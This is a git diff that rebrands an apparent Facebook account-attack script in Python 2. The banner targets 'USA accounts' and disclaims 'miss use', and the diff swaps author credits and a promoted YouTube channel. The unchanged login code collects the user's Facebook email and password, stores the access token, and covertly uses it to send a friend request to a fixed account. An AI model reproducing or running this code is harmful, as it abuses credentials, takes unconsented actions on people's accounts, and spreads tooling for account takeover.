@@ -49,15 +49,15 @@ def jalan(z):
 logo = """
  \033[1;98m●▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●●▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
 \033[1;97m╭━━━┳╮╱╭┳━━━┳╮╭━╮╭╮╱╭┳━━━┳━━━╮\033[1;94m▒▒▒▒   ╱▔▔▔▔╲ ▒▒▒  FUCK USA ACCOUNTS 🔥
-\033[1;97m┃╭━━┫┃╱┃┃╭━╮┃┃┃╭╯┃┃╱┃┃╭━╮┃╭━╮┃\033[1;94m▒▒▒▒ ▕ ╲┊┊╱▏ ▏▒▒▒ WE ARE PAKISTANIS 🔥
-\033[1;93m┃╰━━┫┃╱┃┃┃╱╰┫╰╯╯╱┃┃╱┃┃╰━━┫┃╱┃┃\033[1;94m▒▒▒▒ ▕▕▂╱╲▂▏▏▒▒▒ WE HAVE POWER 🔥
+\033[1;97m┃╭━━┫┃╱┃┃╭━╮┃┃┃╭╯┃┃╱┃┃╭━╮┃╭━╮┃\033[1;94m▒▒▒▒ ▕ ╲┊┊╱▏ ▏▒▒▒ WE ARE PAKISTANIS AND PATHAN 🔥
+\033[1;93m┃╰━━┫┃╱┃┃┃╱╰┫╰╯╯╱┃┃╱┃┃╰━━┫┃╱┃┃\033[1;94m▒▒▒▒ ▕▕▂╱╲▂▏▏ ▒▒▒ WE HAVE POWER 🔥
 \033[1;93m┃╭━━┫┃╱┃┃┃╱╭┫╭╮┃╱┃┃╱┃┣━━╮┃╰━╯┃\033[1;94m▒▒▒▒   ╲┊┊┊┊╱ ▒▒▒▒
 \033[1;91m┃┃╱╱┃╰━╯┃╰━╯┃┃┃╰╮┃╰━╯┃╰━╯┃╭━╮┃\033[1;94m▒▒▒▒    ╲▂▂╱▏ ▒▒▒▒
 \033[1;91m╰╯╱╱╰━━━┻━━━┻╯╰━╯╰━━━┻━━━┻╯╱╰╯\033[1;94m▒▒▒╱▔▔┊┊┊┊▔▔╲▒▒▒
 \033[1;98m●▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●●▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
 \033[1;91m╔🔥═══════════════════════════════════════════🔥═🔥═🔥╗
-\033[1;91m║\033[1;91m☆ \033[1;91mCOMMANDS MAKER Rana Aahil.☠️           ║
-\033[1;91m║\033[1;91m☆ \033[1;91mYOUTUBE CHANEEL Aahil Creations.☠️     ║
+\033[1;91m║\033[1;91m☆ \033[1;91mCOMMANDS MAKER SUFYAN AHMAD.☠️         ║
+\033[1;91m║\033[1;91m☆ \033[1;91mYOUTUBE CHANL TECHNICAL SUFYAN WAFA.☠️ ║
 \033[1;91m║\033[1;91m☆ \033[1;91mIM.NOT.RISPONSIBLE.FOR.ANY.MISS USE.☠️ ║
 \033[1;91m╚🔥═══════════════════════════════════════════🔥═🔥═🔥╝
 """
@@ -65,14 +65,14 @@ logo = """
 ###### LOGO2 ######
 logo2 = """
 	\033[1;32;40m  
-██████╗░░█████╗░███╗░░██╗░█████╗░
-██╔══██╗██╔══██╗████╗░██║██╔══██╗
-██████╔╝███████║██╔██╗██║███████║
-██╔══██╗██╔══██║██║╚████║██╔══██║
-██║░░██║██║░░██║██║░╚███║██║░░██║
-╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝
-  
-"""
+
+░██████╗░░░██╗░░██╗██╗░░██╗░█████╗░███╗░░██╗
+██╔════╝░░░██║░██╔╝██║░░██║██╔══██╗████╗░██║
+╚█████╗░░░░█████═╝░███████║███████║██╔██╗██║
+░╚═══██╗░░░██╔═██╗░██╔══██║██╔══██║██║╚████║
+██████╔╝██╗██║░╚██╗██║░░██║██║░░██║██║░╚███║
+╚═════╝░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
+MERE ZINDAGI MAI AIK HE OSOOL HAI BARDASHT KARNA BSS!SUFYAN AHMAD
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -99,7 +99,7 @@ def login():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		print('\033[1;96m[☆] \x1b[1;91mLOGIN KRO APNA ACOUNT \x1b[1;96m[☆]' )
+		print('\033[1;96m[☆] \x1b[1;91mLOGIN KRO APNA ACCOUNT \x1b[1;96m[☆]' )
 		id = raw_input('\033[1;91m[+] \x1b[1;91mID/Email \x1b[1;91m: \x1b[1;92m')
 		pwd = raw_input('\033[1;91m[+] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;92m')
 		tik()
@@ -129,7 +129,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Hogai'
-				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+				os.system('xdg-open https://www.youtube.com/channel/UCKoxMkvX0kdfztguDxxe09w')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
